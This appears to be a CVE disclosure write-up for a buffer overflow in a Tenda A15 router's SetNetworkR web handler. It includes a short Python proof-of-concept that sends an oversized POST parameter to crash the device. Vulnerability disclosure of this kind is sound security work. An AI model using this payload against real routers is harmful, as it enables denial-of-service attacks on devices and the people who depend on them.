# CVE submission
Affected products and versions: Tenda A15 V15.13.07.13

Affected object type: Network device (router)

Vulnerability type: buffer overflow

Vulnerability URL: http://xxx/goform/SetNetworkR

Vulnerability description: Tengda router A15 V15.13.07.13 has a buffer overflow vulnerability, which can be exploited by an attacker to cause a denial of service.

Vulnerability Analysis Process:
Router Firmware Download:https://www.tendacn.com/download/detail-3187.html
![image](https://github.com/user-attachments/assets/943995f7-1f9f-465c-9592-bdaa3469b4f0)

The vulnerability occurs in the formSetNetworkR function
![image](https://github.com/user-attachments/assets/daf9be37-5fe4-4890-90f0-9c92f7681d2f)

The program obtains the parameter "HTTP/1.1 200 OKrnContent-Length:%drnContent-type: text/plain; charset=utf-8rnPrag ma: no-cachernCache-Control: no-cachernrn", and then pass the user's input into the websDone function, which will handle the characters entered by the user, and if the input value is too large, it will not be processed.

![image](https://github.com/user-attachments/assets/779de29a-970d-4577-80b9-14644242812f)

Cross-locate the formArpNerworkSet function route to SetNetworkR

Attack payloads：
import requests

url = "http://192.168.85.160/goform/SetNetworkR"
data = {
    "HTTP/1.1 200 OK\r\nContent-Length:%d\r\nContent-type: text/plain; charset=utf-8\r\nPrag ma: no-cache\r\nCache-Control: no-cache\r\n\r\n":b'A'*1000000000
}
res = requests.post(url=url,data=data)
print(res.content)

Repetition：
Set up a simulation environment：
![image](https://github.com/user-attachments/assets/0130c71f-603e-4252-894f-a7b787e035fa)

![image](https://github.com/user-attachments/assets/436b76be-a965-4405-a633-aea2ae377111)

Run the script
![image](https://github.com/user-attachments/assets/bdd34207-e46a-40eb-969a-f09294a4cdfb)

CPU occupancy
![image](https://github.com/user-attachments/assets/59d8dbbc-5cee-4070-9d8d-c0a6ac731589)

The router crashes, the website cannot be accessed, and the access denial attack succeeds

Vulnerability reproduction video:
Link: https://pan.baidu.com/s/1HX0p1F342ZmpUZNdoWCkyw 
Extraction code: rjvp
